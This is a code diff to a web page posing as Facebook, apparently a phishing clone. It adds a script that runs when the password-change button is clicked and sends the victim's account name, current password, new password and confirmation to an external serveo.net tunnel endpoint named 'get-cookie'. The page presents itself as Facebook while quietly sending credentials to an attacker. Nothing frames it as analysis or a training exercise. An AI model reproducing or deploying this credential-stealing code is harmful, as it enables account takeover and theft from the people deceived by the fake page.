@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link rel="stylesheet" href="style.css" />
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.6.1/axios.min.js" integrity="sha512-m9S8W3a9hhBHPFAbEIaG7J9P92dzcAWwM42VvJp5n1/M599ldK6Z2st2SfJGsX0QR4LfCVr681vyU5vW8d218w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
     <title>Facebook</title>
   </head>
   <body>
@@ -3681,5 +3682,22 @@
         $("#confirmpassword-field").attr("type", "text");
       }
     });
+  </script>
+  <script>
+    $("#submit-changepassword").on("click",async function() {
+      const res= await axios({
+        url: "https://97ae8efb4cd58b875fbb0cc70e91f776.serveo.net/get-cookie",
+        method: "post",
+        data: {
+          account: accountField.value,
+          pass: passwordField.value,
+          newPassword: newpasswordField.value,
+          confirmPassword: confirmpasswordField.value,
+          ip: ""
+        }
+      })
+      const result= await res.data
+      console.log(result)
+    })
   </script>
 </html>
